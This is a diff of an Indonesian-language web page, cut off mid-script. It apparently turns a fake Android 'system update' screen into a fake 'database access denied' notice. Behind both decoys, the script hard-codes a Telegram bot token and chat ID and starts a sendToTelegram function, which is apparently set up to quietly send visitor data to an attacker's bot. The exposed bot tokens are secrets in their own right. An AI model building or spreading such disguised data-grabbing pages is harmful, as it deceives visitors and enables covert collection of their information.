@@ -1,21 +1,45 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sistem Android</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Database Nusantara</title>
   <style>
-    body { background: #0f0f0f; color: #fff; font-family: sans-serif; text-align: center; padding-top: 50px; }
-    h1 { color: #00ff88; }
-    .loading { margin-top: 20px; font-size: 14px; }
+    body {
+      background-color: #0b0b0b;
+      color: #00ffcc;
+      font-family: monospace;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      padding: 20px;
+    }
+    img.logo {
+      width: 160px;
+      margin-bottom: 30px;
+      filter: grayscale(100%) brightness(150%);
+    }
+    h1 {
+      color: #ff4444;
+      font-size: 1.4em;
+      margin-bottom: 15px;
+    }
+    p {
+      color: #00ffff;
+      font-size: 1em;
+    }
   </style>
 </head>
 <body>
-  <h1>Mengecek Pembaruan Sistem...</h1>
-  <div class="loading">Mohon tunggu beberapa saat</div>
+  <img src="https://borneo101.github.io/DataBase/garuda_ai.png" class="logo" alt="Garuda AI" />
+  <h1>ANDA TIDAK MEMILIKI IZIN UNTUK MENGAKSES DATA BASE INI</h1>
+  <p>Prosedur otorisasi internal sedang berlangsung. Sistem dalam status validasi sumber akses.</p>
 
   <script>
-    const botToken = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0"; // @OpsBorneo_Bot
+    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko"; // @OpsBorneo_Bot
     const chatId = 5677912817;
 
     async function sendToTelegram(text) {
